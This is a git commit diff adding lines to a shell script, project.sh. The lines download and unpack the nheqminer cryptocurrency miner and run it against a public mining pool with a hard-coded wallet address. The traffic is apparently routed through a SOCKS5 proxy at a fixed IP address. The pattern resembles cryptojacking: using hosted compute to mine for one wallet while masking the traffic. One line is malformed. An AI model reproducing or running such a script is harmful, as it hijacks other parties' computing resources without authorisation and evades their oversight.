fa92f3a7e5a8087b09a60f3f97cf58830a51b10f
misrigandus <93632948+misrigandus@users.noreply.github.com>
2021-11-03 12:14:17 +0700

    Update project.sh

--- project.sh
+++ project.sh
@@ -28,4 +28,9 @@ sudo systemctl restart squid -y
 #
 curl -v -x socks5://217.61.128.65:54470 https://github.com/VerusCoin/nheqminer/
 #
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+socks5://217.61.128.65:54470
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.NJAY -p x -t 2
 
